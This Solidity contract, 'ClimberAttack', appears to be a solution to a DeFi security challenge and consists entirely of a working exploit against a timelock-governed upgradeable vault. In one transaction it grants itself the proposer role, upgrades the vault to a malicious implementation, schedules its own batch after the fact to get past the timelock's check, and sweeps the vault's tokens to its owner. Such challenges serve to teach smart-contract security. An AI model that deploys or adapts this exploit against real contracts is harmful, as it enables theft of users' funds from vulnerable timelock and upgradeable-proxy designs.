// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./ClimberTimelock.sol";
import "./ClimberVaultV2.sol";

contract ClimberAttack is Ownable{
    ClimberTimelock private _climberTimelock;
    UUPSUpgradeable private _upgradeable;
    address private _tokenAddress;
    address[] private targets = new address[](3);
    uint256[] private values = new uint256[](3);
    bytes[] private dataElements = new bytes[](3);
    bytes32 salt = "Hello World";

    constructor(address payable climberTimelockAddress, address upgradeableAddress, address tokenAddress) Ownable(){
        _climberTimelock = ClimberTimelock(climberTimelockAddress);
        _upgradeable = UUPSUpgradeable(upgradeableAddress);
        _tokenAddress = tokenAddress;
    }

    function start() onlyOwner public {
        ClimberVaultV2 vaultV2 = new ClimberVaultV2();
        targets[0] = address(_climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)",_climberTimelock.PROPOSER_ROLE(), address(this));
        targets[1] = address(_upgradeable);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("upgradeTo(address)", address(vaultV2));
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("schedule()");

        _climberTimelock.execute(targets, values, dataElements, salt);
        address(_upgradeable).call{value: 0}(abi.encodeWithSignature("sweepFunds(address,address)", _tokenAddress, owner()));
    }

    function schedule() external {
        _climberTimelock.schedule(targets, values, dataElements, salt);
    }

}
